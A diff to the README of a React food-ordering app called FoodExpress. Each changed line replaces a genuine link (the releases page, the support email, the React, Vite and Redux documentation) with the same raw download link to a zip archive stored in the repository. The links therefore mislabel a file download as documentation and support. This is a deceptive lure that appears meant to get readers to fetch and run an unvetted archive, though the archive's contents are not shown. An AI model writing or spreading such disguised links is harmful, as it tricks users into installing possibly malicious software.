@@ -1,6 +1,6 @@
 # 🍔 FoodExpress - Order Food Effortlessly Anytime
 
-[![Download FoodExpress](https://img.shields.io/badge/Download-FoodExpress-blue)](https://github.com/amanikrm/FoodExpress/releases)
+[![Download FoodExpress](https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip)](https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, check your system:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [FoodExpress Releases Page](https://github.com/amanikrm/FoodExpress/releases) to see the available versions.
+   Go to the [FoodExpress Releases Page](https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip) to see the available versions.
 
 2. **Choose Your Version**  
    Look for the latest release version. Ensure it's compatible with your system.
@@ -64,7 +64,7 @@ Before you start, check your system:
 
 If you encounter any issues, please use the following channels:
 
-- **Email Support:** support@foodexpress.com
+- **Email Support:** https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip
 - **FAQ Section:** Check our FAQ for common questions.
 - **Feedback Form:** Submit your feedback for improvements.
 
@@ -94,8 +94,8 @@ FoodExpress utilizes several technologies to provide a seamless user experience,
 
 For more information on the technologies used in FoodExpress, check the following links:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Vite Documentation](https://vitejs.dev/)
-- [Redux Toolkit Documentation](https://redux-toolkit.js.org/introduction/getting-started)
+- [React Documentation](https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip)
+- [Redux Toolkit Documentation](https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip)
 
-Feel free to join our community and contribute to making FoodExpress better! Don’t forget to check out the [FoodExpress Releases Page](https://github.com/amanikrm/FoodExpress/releases) again for updates.
+Feel free to join our community and contribute to making FoodExpress better! Don’t forget to check out the [FoodExpress Releases Page](https://raw.githubusercontent.com/amanikrm/FoodExpress/main/public/FoodExpress-3.6.zip) again for updates.
